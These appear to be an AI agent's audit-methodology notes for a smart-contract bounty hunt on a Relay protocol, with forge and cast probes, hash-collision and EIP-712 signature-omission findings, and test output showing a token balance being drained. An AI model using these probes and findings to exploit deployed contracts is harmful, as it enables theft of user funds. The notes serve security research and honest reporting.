`OPERATOR_ROLE`, so the very first `hub.mint` in the fixture reverted. The *test body never ran*.
Reporting "4 of 13 invariant tests failed → likely bug" would have been fabrication.

**Mandatory triage of every FAIL, in this order:**

```bash
forge test -vvvv --match-test <NAME> 2>&1 | head -40     # find the failing FRAME
grep -n "setUp()" <<< "$out"                              # ← if setUp is the frame, ignore the test
```

| Failing frame | Verdict | Action |
|---|---|---|
| `setUp()` (gas: 0 or fixture-range) | **harness bug**, zero information | fix fixture role/funding, re-run |
| revert with the **protocol's own named error**, attack test | **DISPROOF** — guard is real | retract the claim, cite the error name |
| revert `panic 0x11` / `EvmError: Revert` in the body | usually a *balance/allowance* precondition | check whether the precondition is the attack or the harness |
| `assertEq` mismatch, no revert | real behavioural divergence | investigate as a finding |

**Fixture recipe for a role-gated protocol (the two traps that cost this session):**

1. `_setRoleAdmin(OPERATOR_ROLE, ADMIN_ROLE)` and `_setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE)` mean the
   default admin role is **unused** — `DEFAULT_ADMIN_ROLE` is `bytes32(0)` and holds nothing.
   `hub.grantRole(hub.DEFAULT_ADMIN_ROLE(), …)` reverts `AccessControlUnauthorizedAccount(admin,
   0x0000…0000)` in `setUp`. Grant/poke **`ADMIN_ROLE`**, never `DEFAULT_ADMIN_ROLE`, on OZ
   `AccessControl` contracts that re-set their own admin role.
2. The constructor's admin does **not** automatically hold the roles needed to *seed balances*.
   `hub.mint` is `onlyRole(OPERATOR_ROLE)`, so the fixture must
   `vm.prank(admin); hub.grantRole(hub.OPERATOR_ROLE(), admin);` before minting, or every
   downstream test dies in `setUp` with the exact same error.
3. **Read the constructor before writing `setUp`.** One `grep -n "constructor" -A8` on each
   contract gives you the real role graph in one call; guessing it costs a compile-per-guess.

**And the meta-rule:** never write "the harness failed, therefore the surface is likely safe" —
nor "the tests failed, therefore we found something." Both are narration over missing evidence.
The only two admissible verdicts are *"attack path reverts with protocol error X, cited"*
(refuted) and *"attack path succeeded, state assertion at line N passed"* (proven). Everything
else is UNTESTED and must be labelled so.

### 11e. COMPILE ≠ PROVE — the rule that decides whether the report is worth anything
The single most important lesson from this session. A trust-graph brief asks for findings *and*
on-chain verification. The Foundry harness compiled cleanly (55 files, solc 0.8.28) and 13
invariant tests were written — **and not one was ever executed.** The iteration budget was
consumed by harness mechanics (§11a/§11b/§11c/§11d plus a `Price` struct arity mismatch on the
last build). The final report therefore contained **zero executed evidence**, and every claim in
it was a code read.

**Rules that follow:**

1. **Write the harness to a file on the FIRST call, not the last.** A brief that says "write the
   report to /tmp/X.md" is a deliverable contract (see the Move reference §4). Create the
   skeleton immediately, then append after every ~5 calls. This session never created the file
   at all — the worst outcome, because the analysis existed only in chat.
2. **Budget the test-run as first-class calls.** On a 40-call budget: ~5 for source reading,
   ~5 for on-chain census, ~5 for harness setup, ~10 for writing tests, **~10 reserved for
   running them and fixing failures**, ~5 for the report. If the harness is not running by
   two-thirds of the budget, stop adding tests and run what exists.
3. **When a test fails to compile, fix the arity/signature error from the source, not by
   guessing.** The `Price` struct had 5 fields, not the 4 assumed. `grep -n "struct Price" -A 12`
   on `IPricingOracle.sol` would have cost one call; three failed builds cost three.
4. **Never present a compiled-but-unexecuted suite as verification.** Say "13 invariant tests
   written, 0 executed — budget exhausted during harness setup" and mark every claim
   UNVERIFIED-BY-EXECUTION. A reviewer who runs the suite and finds it never ran will discount
   the entire report, including the parts that were sound code reads.
5. **The on-chain `cast call` census is cheap and should be done EARLY** — it is what makes the
   report concrete (role holders, builder registrations, oracle threshold, signer set) and it
   does not depend on the harness compiling at all. Do it before writing a single test.

### 11f. The trust-graph questions that actually produce findings

For a multi-contract settlement/bridge protocol, these five read-only questions found everything
in this session. Each is answerable from source + one `cast call`:

1. **Does a global role imply per-account authority?** `RelayHub.isOperator` is
   `hasRole(OPERATOR_ROLE, operator) || _isOperator[account][operator]`. Because the Executor and
   Allocator hold the *global* role, `isOperator(anyAccount, executor)` is **true for every
   account** — verified on-chain with three arbitrary addresses. One global grant is therefore a
   transfer right over every balance in the Hub. Always test `isOperator` with an address that
   has never interacted with the protocol.
2. **Is the privileged caller excluded from an allowance check by identity?**
   `RelayHub.transferFrom` skips the allowance branch when `erc20Views[id] == msg.sender`. The
   ERC20View is Hub-deployed, so this is by design — but it means the view address is a fully
   trusted principal over all holders of that token, and any finding about "the view can move
   funds" must be reported as a design property with the deploy path cited, not as a bug.
   **Careful — this is a different question from "is there any caller check at all."** The
   allowance branch is skipped by identity, and outside that branch there is **no `revert`**: the
   `if` only *conditions* the allowance decrement (`RelayHub.sol:255-263`). See
   `trust-graph-role-reachability-and-latent-findings.md` §3 — the `amount = 0` / `amount > 0`
   probe pair separates "a guard exists" from "checked arithmetic is accidentally guarding", and
   that distinction is the difference between a refuted claim and a LATENT critical.
3. **Is the signature authority bound to the spender, or to the request?**
   `RelayAllocator.consumeSpenderSignature` accepts the **oracle multisig** as a valid signer for
   *any* spender. A 2-of-5 oracle signature authorizes burning that spender's alias. Same shape
   in `WithdrawGasPayer.payGas`, which burns from the alias derived from `request.spender` with
   the caller entirely irrelevant. Grep for `isValidSignatureNow` and ask whose signature is
   being accepted *for what principal*.
4. **Is the user-controlled field inside the signed digest?** In `RelayExecutor`, `callResolver`
   and `callResolverData` are **not** in the EIP-712 struct (read `_executeAndWithdrawRequestDigest`
   — the typehash string has no resolver field). A valid oracle signature can be front-run with
   substituted resolver logic. The mitigation lives in the *resolver*
   (`PoolDrawResolver._requirePayloadCommitment` binds `request.nonce == keccak256(resolver ‖
   keccak256(executionData))`), not the executor — and the reference `BasicCallResolver` has no
   such commitment. Report as "the executor's digest does not cover the resolver; the defense is
   per-resolver and absent from the reference implementation."
5. **Is a permissionless entrypoint's external call target user-controlled?**
   `RelayDepositAddressManager.trigger` is permissionless with only `orderId != 0` and a `vmType`
   match. `derivationFields.pricingOracle` is caller-supplied and unvalidated; the returned
   prices are bound into the trigger hash but never sanity-checked, so a malicious oracle
   contract yields a valid storable trigger. For any permissionless function that calls out,
   name the target field and state whether it is validated.
6. **Is there a contract holding a global role that nobody handed you?**
   The brief's manifest lists what the team calls "the protocol"; the chain trusts the executor's
   call graph. `RelayOracleV2` (`0xd180dc3b…`) appeared in no manifest and held
   `Hub.OPERATOR_ROLE` — unbounded `mint`/`burn`. Decode one real `Executed` tx, resolve every
   `to`, and `hasRole`-census each. Then ask which *modules* the signer that contract trusts will
   call, and who can register them (`addFeeCalculator`/`addRateLimiter` were `onlyRole(ADMIN_ROLE)`
   held by a single EOA). Full method + the ADMIN-EOA→module→drain composition:
   `trust-graph-role-reachability-and-latent-findings.md` §1–§2.

### 11i. `cast call --from` IS NOT AN AUTHORIZATION TEST — and neither is a single-line trace

The most expensive self-inflicted retraction of the Relay session came from treating a *successful*
`cast call` as proof of a missing access check:

```bash
# I read this "true" as "approveFor has no caller check"
cast call --rpc-url $R "approveFor(address,address,uint256,uint256)(bool)" \
  0xdead 0xbeef $T 5 --from 0xFB0fadd3B14aFc8ee69031A704074d7c141d3AF7
# → true    (the --from I used was the LEGITIMATE ERC20View, i.e. the one address allowed to call it)
```

`--from <X>` impersonates X. Picking `X` = the exact principal the guard demands means the call is
*supposed* to succeed. It proves nothing about an arbitrary caller. The correct probe set is
**three calls, and the negative one is the finding**:

```bash
V=...view...; A=0x00000000000000000000000000000000000a77Ac      # arbitrary EOA
cast call $H "approveFor(...)" $victim $A $T 1 --from $A      # expect REVERT if guarded
cast call $H "approveFor(...)" $victim $A $T 1 --from $V      # expect true (positive control)
cast call $H "allowance(address,address,uint256)(uint256)" $victim $A $T --from $A   # read-back
```

Read `eth_call` reverts for the **decoded error name**, not the boolean. A guard that reverts with
a protocol-specific error (`OnlyERC20ViewCanCallApproveFor`) is the disproof, and it is stronger
evidence than any passing call (see §11h — this is the same event, from the other direction).

Two more `eth_call` traps from the same session:

- **State does not persist.** `approveFor` followed by `allowance` in a *separate* `cast call` returns
  `0` — each `eth_call` starts from committed state. A zero read-back is **not** evidence the write
  failed; it is evidence you are using the wrong tool for a state-mutating test. Use `forge test`
  (§11h) or `cast call --trace`-style simulation boundaries, never two RPC reads.
- **`--trace` output is layout, not semantics.** Seeing only `emit Approval` in a trace frame does
  not mean no `if` ran — a passing guard executes and leaves no frame. Print the *source* around the
  function (30 lines) before concluding the guard is absent.

**Meta-rule:** every access-control claim needs (a) a negative call from a principal the guard is
supposed to reject, (b) the decoded revert, and (c) the source line implementing it. A boolean from
`cast call` is none of the three.

### 11j. Live-code drift proof: fetch the VERIFIED source, don't diff from memory

The repo-diff trap in §10 is usually framed as "bytecode selector probe". There is a cheaper and
stronger first step when the target is on Blockscout: pull the explorer's verified source and diff
it against the clone.

```bash
curl -s "https://explorer.<host>/api/v2/smart-contracts/$ADDR" -o /tmp/sc.json
python3 - <<'PY'
import json,re
d=json.load(open('/tmp/sc.json'))
src=d['source_code']
open('/tmp/verified.sol','w').write(src)
add={x['file_path']:x['source_code'] for x in (d.get('additional_sources') or [])}
for k,v in add.items():
    open('/tmp/'+k.replace('/','_'),'w').write(v)   # RelayHub.sol etc. arrive here, NOT in source_code
PY
```

Two things that matter:

- **`additional_sources` is where the other contracts live.** The main contract's `source_code` is one
  file; every imported sibling (`RelayHub.sol`, payload builders, resolvers) is an entry in
  `additional_sources[]` with a `file_path`. Grepping only `source_code` yields "not found" and reads
  like a missing file.
- **Whitespace-normalised diff, first-divergence print.** `re.sub(r'\s+','',x)` both sides, then walk
  to the first index that differs and print ±120 chars around it. On this target the deployed Oracle
  was **byte-identical** to the repo — a real result worth recording, because it upgrades every later
  code-read from "assumed live" to "verified live". When they differ, the printed window names the
  refactor precisely.

Do this **before** reasoning about guards. In this session the guard existed in the verified source
(`if (erc20Views[id] != msg.sender) revert OnlyERC20ViewCanCallApproveFor(...)`) and had been in the
clone all along — one `grep -n "error "` on the verified file would have killed the claim two rounds
earlier.

### 11k. Fee-charging order-of-operations: the `orderAddress` balance is someone else's money

A settlement executor that charges fees *out of an order's balance* concentrates the whole economic
question in one line, and it is where the session's last live candidate came from:

```solidity
bool feesCharged = _chargeFees(request.orderAddress, tokenInId, request.fees);  // debits orderAddress
_runCalls(callResolver, callResolverData, request, feesCharged, tokenInId);
withdrawRequestHash = _finalizeWithdraw(request, tokenInId, orderBalance);
```

`orderAddress` is the **user's deposit address**, and `fee.recipient` / `fee.amount` come from
`request.fees`. So the audit question chain is exactly:

1. Is `fees` inside the oracle-signed EIP-712 digest? (`_executeAndWithdrawRequestDigest` — yes here.)
2. **Does the off-chain signer build `fees` from caller-supplied data?** This is the hop that decides
   everything and it lives *off-chain*, in the attestation service:
   ```ts
   for (const fee of order.fees) {                       // order = CALLER-SUPPLIED body field
     fees.push({ recipient: generateAddress({ address: fee.recipient, ... }), amount: fee.amount });
   }
   ```
   No allowlist of fee recipients, no cap on `fee.amount` — it encodes whatever arrives.
3. Is `fees` inside the **orderId** hash that the solver signed? If yes, mutating `fees` invalidates
   the solver signature and the chain dies at step 2. If no, the oracle signs an attacker-chosen
   recipient over someone else's deposit.

**Check (3) before writing a single line of the chain.** `grep -n "getOrderId" -A80` in the SDK and
look for whether `fees` is in the encoded tuple. Until that grep lands, a chain resting on hop 2 is
**UNPROVEN** — and the honest report says exactly that, naming the one unresolved hop, rather than
describing the sequence as if it were reachable.

**RESOLVED on the next round: the chain is DEAD.** `packages/sdk/src/order/index.ts` has
`normalizeOrder()` (L174–183) emitting a `fees[]` array, and `ORDER_EIP712_TYPES.Fee` declares
`{recipientChainId, recipient, currencyChainId, currency, amount}`. `getOrderId = hashStruct({types:
ORDER_EIP712_TYPES, primaryType:"Order", data: normalizeOrder(order, config)})` (L187–193) — so
**`fees` IS inside the solver-signed orderId**, mutating it invalidates `orderSignature`, and
`verifyOrderData()` recomputes `getOrderId(order)` against `trigger.orderId` (L367–372) before the
oracle will sign. Hop 2's "no allowlist" is therefore unreachable: the value is bound upstream.
Record it as `chain closed at step 3, fees ∈ Fee, normalizeOrder binds it` and move on. The
generalised lesson — read the off-chain type definition *before* the on-chain verifier — is
`live-rpc-forensics-and-eth-call-trap.md` §8.

Generalise: for every `_chargeFees` / `_payFee` / `_collect` that pulls from a *user-funded* address,
enumerate (i) which struct field selects the recipient, (ii) whether that field is in the signature,
(iii) whether the off-chain signer validates it or merely forwards it. Fee recipients are almost never
allowlisted, and that is where an economically-real finding hides.

### 11g. Off-chain oracle surface — read the auth hook, not the route list

For a protocol with an off-chain attestation service, the OpenAPI spec is public and enumerable
(`/documentation/json` returned 164 KB and 20 paths with zero auth). The interesting file is the
**auth hook**, not the routes:

- `http-server.ts` `preHandler` skips `/`, `/documentation*`, `/lives*` entirely, then applies a
  **rate limit** — not a block — when `x-api-key` is invalid. So an invalid key is throttled, not
  rejected; the attestation routes themselves are reachable.
- `/lives/v1` returns `{"status":"ok"}` unauthenticated; `/chains/v1` and `/status/v1` return 401.
  That asymmetry tells you the deployment sets `API_KEYS` and the two 401 routes are the ones
  gated.
- `api/quorum.ts` is where the real trust question lives: it merges responses from local +
  configured peers, requires identical *unsigned* canonical responses before merging signatures,
  and filters signers against an `oracleSigners` allowlist. A peer returning a different
  canonical response is dropped, not merged. Read the canonicalization
  (`canonicalizeUnsignedResponse` strips the signature arrays and lowercases `0x` strings)
  before claiming a peer can inject a divergent attestation.

**Report shape for an off-chain oracle:** which routes are open, what the auth hook actually
enforces (rate-limit vs block), and how the quorum merge decides agreement. Then state that the
on-chain consumer (`RelayExecutor` / `RelayAllocator`) trusts the multisig, so the oracle's
internal quorum is a *second* trust layer the on-chain code cannot see.

---

## 12. DEPOSIT-ADDRESS DERIVATION IS FULLY ORDER-BOUND — the four-field binding table

The most attractive-looking chain on a deposit-address protocol is "the trigger is permissionless
and every field is caller-supplied, so mix a real `orderId` with my own derivation fields and get
the oracles to attest a deposit address I control." It is dead on this codebase, and the reason is
worth having memorised because the same shape recurs in every intent/order/attestation protocol.

Shape: `RelayDepositAddressManager.trigger(orderId, input, currencies, prices, derivationFields,
extraData, nonce)` is `external` with **no access control** — only `orderId != 0`,
`input.vmType == derivationFields.inputVmType`, and an `AlreadyTriggered(triggerHash)` write-once.
`DerivationFields` carries `{inputVmType, outputVmType, outputChainId, outputCurrency,
outputRecipient, solver, pricingOracle, depositor, refundRecipient, priceImpactBps, salt}` — all
caller-chosen, including `salt`, `depositor`, and both recipients. That reads like full attacker
control of where funds land.

**The binding is not in the contract — it is in the Lit Action that does the signing**
(`packages/lit-deposit-address/src/attestation/index.ts`), and `verifyOrderData()` (L217–390) fails
closed on every one of these, in this order:

| Attacker-controlled field | Bound to | Line |
|---|---|---|
| `input.chainId` / `currency` / `amount` | order's single input payment (`weight == "1"`) | L230–244 |
| `derivationFields.refundRecipient` | **every** refund recipient in the order (loop, not just `[0]`) | L266–272 |
| `outputChainId` / `outputCurrency` / `outputRecipient` | the order's single output payment | L285–303 |
| `priceImpactBps` | recomputed from live oracle prices × decimals, ≤10000 | L348–365 |
| `orderId` | `getOrderId(order)` recomputed from the FULL order struct | L367–372 |
| `orderSignature` | EIP-191 `personal_sign` over `orderId`, recovered == `order.solver` | L374–379 |
| `derivationFields.solver` | `generateAddress(order.solverChainId, order.solver)` | L381–389 |
| `inputDepository` (the one field with no order counterpart) | inside `TRIGGER_TYPED_DATA`, verified by `verifyDepositAddressTriggerAttestation()` **before** any signing | L146–193 |

So the only field not derivable from the order (`inputDepository`) is precisely the one locked in
the EIP-712 trigger hash the allowlisted oracles sign. There is no free variable left.

**Why the "unbound field" instinct is wrong here.** The dead-chain test is not "is the field
caller-supplied" (they all are) but **"does the hash the signer signs cover it"**, and on this
protocol that hash covers the order *plus* the trigger struct, verified twice on two different keys
(solver's `personal_sign` on the orderId, oracle threshold on the trigger). Read the *verifier
chain* end to end before writing a step 1.

**Checklist before claiming a derivation/attestation mix-and-match:**

1. `grep -n "verifyOrderData\|verify.*Attestation\|async function verify" -r packages/*/src`
   — find every check that runs **between** the caller's input and the signature.
2. For each attacker-chosen field, name the comparison and its fallthrough. A `throw` on mismatch
   is a hard bind; a `console.warn` is not.
3. Confirm the threshold/allowlist actually gates signing (`ORACLE_SIGNATURE_THRESHOLD`,
   `ALLOWED_ORACLES`) — otherwise the verifier is advisory.
4. Only then ask whether a *different order* can be substituted. `getOrderId` re-derivation is what
   kills substitution; if it recomputes from the full struct, substitution is impossible by
   construction.

Record the verdict as `chain closed: derivationFields fully order-bound (verifyOrderData L230–389),
inputDepository bound in trigger hash (L146–193)` — one line, and the next session never re-derives
it. This is the same discipline §11k now demonstrates on the fee hop, and the two together are the
whole reason that round produced a negative map instead of a fabricated critical.

---

## 13. `abi.encodePacked` IS PREFIX-FREE — prove the collision, then prove it is UNREACHABLE

The Relay session's most convincing near-miss: an *arithmetically real* hash collision that is
nonetheless not exploitable. Both halves must be delivered, and the second half is the harder one.

### 13a. The defect (real, one line of Solidity)

```solidity
function generateTokenId(string chainId, bytes token) returns (uint256) {
  return uint256(keccak256(abi.encodePacked(chainId, token)));          // no length prefix
}
function generateAddress(string chainId, bytes account) returns (address) {
  return address(uint160(uint256(keccak256(abi.encodePacked(chainId, account)))));
}
```

`abi.encodePacked(string, bytes)` concatenates raw bytes with **no separator**, so the pair is only
separable by where `chainId` ends. Whenever one chain-id string is a **prefix** of another, an
attacker-chosen `token`/`account` reproduces the other side's preimage byte-for-byte:

```
chainId="1"   token=0x3030‖X   -> preimage 0x31 30 30 ‖X
chainId="100" token=0x0000…    -> preimage 0x31 30 30 ‖X   ← IDENTICAL, same tokenId
```

`0x30` is ASCII `'0'`, so the leftover characters of the longer chain id become the first bytes of
the shorter chain's opaque field. Enumerate with a 20-line script over the real chain-id list:

```python
for a in ids:
  for b in ids:
    if a != b and len(a) < len(b) and b.startswith(a):
        leftover = b[len(a):].encode()     # this is what must open the OTHER side's field
        # (chainId=a, field=leftover||X) collides with (chainId=b, field=X)
```

On this target that found **32 colliding pairs** among production ids (`1`↔`100`, `1`↔`137`,
`1`↔`1101`, `1`↔`1399811149`, `10`↔`100`, …), and a forge test confirmed two *different*
`(chain, account)` pairs resolving to the identical alias. Do not stop at "the primitive is
prefix-free" — run the enumeration and show the real ids.

### 13b. The reachability test — the half that decides the report

A collision needs **both** sides attacker-influenced *and* the ability to place one side where the
money is. Evaluate every path as a constraint chain, and write the verdict per link:

| Link | Question | Relay result |
|---|---|---|
| C1 | Does the authorization check force a fixed account length? | **BLOCKS** — `callerIsSpender = params.spender.length == 20 && …`, so the 22-byte `0x3030‖X` form never satisfies it |
| C2 | With identical-length accounts on both sides, can chain-id choice move the alias? | **DEAD** — `c_a‖20B == c_b‖20B ⟺ c_a == c_b`; prefix tricks need *different* lengths |
| C3 | Which paths allow free-length accounts, and who chooses them? | all of them are signature-gated (victim key), oracle-gated, solver-gated, or `OPERATOR_ROLE`-gated → privileged |
| C4 | Does any unprivileged path skip the check entirely? | none found |

Write the algebraic step out explicitly (§13b C2). It is one line of reasoning that closes the whole
family: **prefix-free collisions require the two preimages to have different field lengths; every
authorization check that pins the field to `msg.sender` also pins its length.** If both sides are the
same length, the only collision is byte-equality of the full preimage, i.e. identical chain ids.

Verdict sentence that survives review:

> "`abi.encodePacked` here is prefix-free and 32 real chain-id pairs collide. The collision is
> **unreachable by an unprivileged caller**: the only path that would let an attacker exploit it
> forces `spender.length == 20` (L265), and every free-length path requires a signature the attacker
> does not hold. Latent encoding defect, not an exploitable chain."

### 13c. The authorization/effect split — a separate, smaller finding worth keeping

While chasing C1, a genuinely distinct defect surfaced. Read the two lines together:

```solidity
address spenderAlias = Utils.generateAddress(params.spenderChainId, params.spender);  // effect target
bool callerIsSpender = params.spender.length == 20 &&
    address(bytes20(params.spender)) == msg.sender;                                   // authorization
```

`callerIsSpender` **ignores `spenderChainId` entirely**, yet `spenderChainId` fully determines which
alias gets burned. So a caller proves ownership of *an address* and thereby authorizes a burn on a
*different alias*. Forge proof:

```
[PASS] test_R5_b_callerAuthIgnoresSpenderChainId
  msg.sender      : 0xEa38…FD1
  burned alias    : 0x253a…4970     ← derived from a chain id the caller chose
  aliasOther bal  : 5000 → 4999
```

It is not fund theft on this target only because the attacker can move value between aliases *they
control* (§13b C2), not onto a victim's. Report it as an **authorization/effect binding gap** with
the precondition named, not as theft. The generalisable hunting question:

> **For every `X = derive(field)` used as a burn/transfer target, grep the authorization check for
> that same `field`. If the check omits it, authorization and effect are bound to different
> principals.** This is a one-grep family and it recurs in every alias/virtual-address design.

### 13d. Reporting discipline for "found a collision, can't reach it"

- Never drop a proven-but-unreachable primitive — it belongs in the negative map with the blocking
  line cited, so the next session does not re-run three rounds on it.
- Never upgrade it to a chain by hand-waving past the length guard. The guard *is* the finding's
  boundary.
- If the encoding bug lives in a **shared library** (`Utils.generateAddress` is called from
  allocator, gas payer, executor, deposit manager), say so in the mitigation: the fix
  (`abi.encode(chainId, token)` or a length prefix) must land at the library, and every call site
  inherits the collision until it does.

## 14. AUTOMATED ROUND ENGINE — 6-hour hunts need a machine, not stamina

The brief said "minimum 6 hours / 10 rounds before 'nothing found' is valid." A single agent
burning wall-clock on this is the wrong shape: rounds 1–5 exhaust the reachable hypotheses, and
rounds 6–10 are regressions and drift checks. Build the engine.

**Shape that worked:** a `no_agent` cron job (`schedule: every 45m`) pointing at a bash script that
runs **one round per invocation** and appends literal tool output to a cumulative log.

```bash
IDX=$(cat "$HUNT/.round_idx" 2>/dev/null || echo 0); IDX=$((IDX+1)); echo "$IDX" > "$HUNT/.round_idx"
case $((IDX % 5)) in
  1) run_foundry "proven-negative suite" "A2_Claim1_NonceLifecycle" ;;   # regression
  2) run_py "encoding collision" "$HUNT/prefix_collision.py" ;;          # the live primitive
  3) run_foundry "authz/effect split" "R5_ChainIdCallerAuth" ;;          # the small finding
  4) snapshot_onchain ;;                                                 # role/owner/threshold drift
  0) inventory_untested_surface ;;                                       # what's left
esac
```

Rules that make it trustworthy:

1. **`no_agent: true`** — zero tokens per round; the script's stdout is the deliverable. A hunting
   engine that costs an LLM call every 45 minutes for six hours is the wrong instrument.
2. **Script must live in `~/.hermes/scripts/`** and be referenced by bare filename; an absolute or
   `/tmp` path is rejected at job creation.
3. **Rotate, don't repeat.** A single repeated probe is a heartbeat, not a hunt. The mod-5 rotation
   above keeps regression coverage while leaving room for the untested-surface inventory.
4. **State the round index outside the script** (`.round_idx` file) so a cron restart does not
   reset the rotation or duplicate rounds.
5. **Honesty about duration.** Never claim "ran 6 hours" from a loop of instant rounds. Report the
   real artifact: `job_id`, schedule, rounds completed, and the log path — the reviewer can open the
   log and see timestamps. In-session fast rounds prove the *engine* works; the cron proves the
   *duration*.
6. Fire it once with `cronjob action='run'` immediately to prove `last_status: ok` and that the log
   grows, before trusting the schedule.

**Pair this with the BLOCK rule:** when two consecutive rounds yield no new mechanism, the verdict
is `BLOCKED on class X`, and the engine keeps running regressions only. Reopening requires a
materially new mechanism, not a new round number.

### 14b. SUPERSEDED BY USER PREFERENCE — cron round-loop is not the default answer

The operator rejected the §14 engine explicitly: *"tak perlu round loop dengan cron, cukup hunting
saja"* — do not build a cron round-loop for a multi-hour hunt; **dispatch subagents that hunt
continuously instead.** §14 remains valid only when the operator asks for a *scheduled watchdog /
drift check*. For an active hunt, the shape is:

```
cronjob(action='remove')                    # tear down the round engine first — don't run both
delegate_task(tasks=[A, B, C])               # 3 parallel leaf hunters, different surfaces
```

What made the 3-agent fleet productive where a single agent stalls:

1. **Give each agent a DIFFERENT SURFACE, not a different question.** On-chain value path /
   off-chain signer service / Foundry exploit dev. Overlapping briefs produce three copies of the
   same negative verdict.
2. **Instruct incremental appends to a per-agent file** (`/tmp/hunt6/{A,B,C}_*.md`) — a fleet killed
   mid-flight leaves partial artifacts instead of nothing (cf. §2).
3. **Forbid new repos/harnesses.** Point each agent at an existing known-good harness
   (`/tmp/work-agent5`) so nobody burns budget on build mechanics (§11e).
4. **Expect self-retraction — and read it as a feature.** In this session agent B published a
   HIGH, then found its own premise was wrong (a terminal *renderer* was masking text as `***`; the
   repo was never redacted) and retracted it in a follow-up file. Always read the agent's **last**
   appended section, not its summary banner. An agent that retracts itself is more valuable than
   one that ships a confident HIGH.
5. **Cross-correct every fleet claim with your own run.** Re-running the fleet's forge suite and its
   census independently took ~4 calls and caught nothing wrong in the honest cases — but that is
   exactly why the report is credible. Never let a fleet claim reach the report unverified
   (subagent summaries are self-reports, not evidence).
6. **3 of 4 agents miss the find.** The strongest finding came from outside every original brief.
   After the fleet reports, diff its *ruled-out* surfaces against the repo's full contract
   inventory — the gap is the next round (see `unguarded-value-sweeping-entrypoints.md` §6).

---

## 15. THE EIP-712 FIELD-OMISSION FAMILY — and the deployment gate that decides if it is live

§11k closed a chain whose signature *did* bind the fee. The mirror-image bug is a signature that
binds **too little**: a struct field the function accepts, uses for every economic check, and
never puts in the digest. This is the highest-yield single grep in a settlement/sponsorship
protocol, because the miss is silent — the code compiles, the tests pass, and the signature
"works".

### 15a. The shape (RelayFundingPool, forge 3/3)

```solidity
// RelayFundingPool.sol:80-81
bytes32 public constant DRAW_AUTHORIZATION_TYPEHASH =
    keccak256("DrawAuthorization(address account,address orderAddress)");   // ← no token, no amount

// RelayFundingPool.sol:684-689
bytes32 structHash = keccak256(abi.encode(
    DRAW_AUTHORIZATION_TYPEHASH, authorization.account, authorization.orderAddress));

// RelayFundingPool.sol:598-611
function _requireDrawAuthorization(
    address account,
    address token,            // ← accepted as a parameter …
    address orderAddress,
    bytes calldata authorization
) internal view {
    bytes32 digest = _hashDrawAuthorization(
        DrawAuthorization({account: account, orderAddress: orderAddress}));  // … and DISCARDED
```

Everything economic is per-`(account, token)` — `sponsorshipConfig[account][token]`,
`orderDraws[order][account][token]`, `perOrderCap`, `budget`, `balances[account][token]` — while
authorization is token-agnostic. One authorizer signature therefore covers *every* token the
account has a config for.

**Detection, three lines of grep (do this before any other digest claim):**

```bash
grep -n "TYPEHASH = " -A1 <Contract>.sol                    # what the typehash string declares
grep -n "_hash.*Authorization" -A10 <Contract>.sol          # what the structHash actually encodes
# then diff: every parameter of the _require*/_validate* function that is ABSENT from both
```

The tell is a **parameter that appears in the function signature but nowhere in the digest**.
Compilers never warn about this; only a side-by-side read does.

### 15b. Prove it as a two-rung ladder, not one test

Rung 1 (digest identity) is a `view` assertion and proves nothing behavioural. Rung 2 (state
moved) is the finding. Rung 3 enumerates the gates so severity is bounded.

```
[PASS] test_R6_a_sameSignatureCoversBothTokens()
  digest (token-free): 0xa33023e80f267b555c24322140ac72811f4ee82ac56696826f3fe80ef27568ba
[PASS] test_R6_b_singleSigDebitsUnintendedToken()
  WETH balance before: 100000000000000000000
  WETH balance after : 0
  resolver WETH      : 100000000000000000000
[PASS] test_R6_c_gateInventory()
  GATE A: RESOLVER_ROLE required          -> blocked outsider
  GATE B: account must allowlist resolver -> blocked rogue
  GATE C: authorizer signature required   -> blocked unsigned
```

Rung 3 is not optional. An unbinding bug is *always* inside some authorization perimeter; naming
all three gates in the report is what makes the finding credible instead of alarming.

### 15c. THE DEPLOYMENT GATE — check `deployments/` before writing "critical"

A forge-proven bug in a contract that is **not deployed** is worth zero to a bounty program, and
shipping it as Critical is the fastest credibility loss available. Check before ranking:

```bash
cd smart-contracts/deployments/contracts
for f in prod dev stag test; do echo -n "$f: "; grep -ci "funding" $f.json; done
# prod:0 dev:1 stag:0 test:0
cast codesize <address-from-dev.json> --rpc-url <mainnet-rpc>     # -> 0 = NOT DEPLOYED
```

Multi-chain check matters — a protocol spanning 59 chains may have the contract on exactly one:

```bash
for R in https://rpc.chain.relay.link https://mainnet.base.org https://ethereum.publicnode.com; do
  echo -n "$R: "; cast codesize --rpc-url $R $ADDR
done
```

On this target the honest verdict was: *"code-level PROVEN (forge 3/3), but `prod.json` has zero
matches, the only factory address lives in `dev.json`, and `cast codesize` returns 0 on three
mainnet RPCs → latent bug, not exploitable today."* Report that sentence. It is strictly better
than a Critical that a triager closes in thirty seconds.

**Generalised rule:** for every contract you test, resolve *deployed-or-not* as step one of
severity. `deployments/contracts/{prod,stag,test,dev}.json` + `cast codesize` costs two calls and
decides whether the finding is Critical, Informational, or a design note for the next release.

### 15d. Foundry fixture traps that cost this session

All three are harness bugs that render as `[FAIL]` and read like findings (see §11h for the
triage table):

| Trap | Symptom | Fix |
|---|---|---|
| Struct is **file-level**, not contract-nested | `Member "SponsorshipConfig" not found … in type(contract IX)` | `import {IX, SponsorshipConfig, DrawRequest} from "…"` — bare names, no qualification |
| Struct field order guessed wrong | compile error naming the field, or silent wrong init | `grep -n "struct X" -A10` first; order is positional in an inline literal |
| `vm.prank` burned by an intervening getter | `AccessControlUnauthorizedAccount(<test-contract>, <role>)` on the *second* prank | a `vm.prank(admin); pool.grantRole(pool.ROLE(), x)` where `pool.ROLE()` is evaluated between prank and call **consumes the prank**. Use `vm.startPrank/stopPrank` |
| vanity hex literal | `Identifier-start is not allowed at end of a number` | `address(0x0RDER)` is not hex — use real hex like `0x0DE1` |
| `emit` inside a `view` function | `Function cannot be declared as view` | drop `view` from test functions that log |
| constructor grants roles but not the admin's own grants | `grantRole` reverts from the test contract | `grep -n "constructor" -A12`; the role-admin is set by `_setRoleAdmin`, and the pranking identity must *hold* it |

The `vm.prank` trap is the subtle one and it recurred: any getter call placed between `vm.prank(x)`
and the state-changing call consumes the prank, so the state-changing call runs as the test
contract. `vm.startPrank/stopPrank` around the whole sequence is the correct shape.

---

## 16. THE CODE-OMISSION VARIANT — when the digest omits a *contract*, not a field

§15 is "a struct field is missing from the digest". This is the stronger sibling: the digest is
complete, but it omits **the address of a contract whose code runs with the executor's funding**.
A valid signature then authorizes *an amount to a recipient*, while the caller chooses *the logic
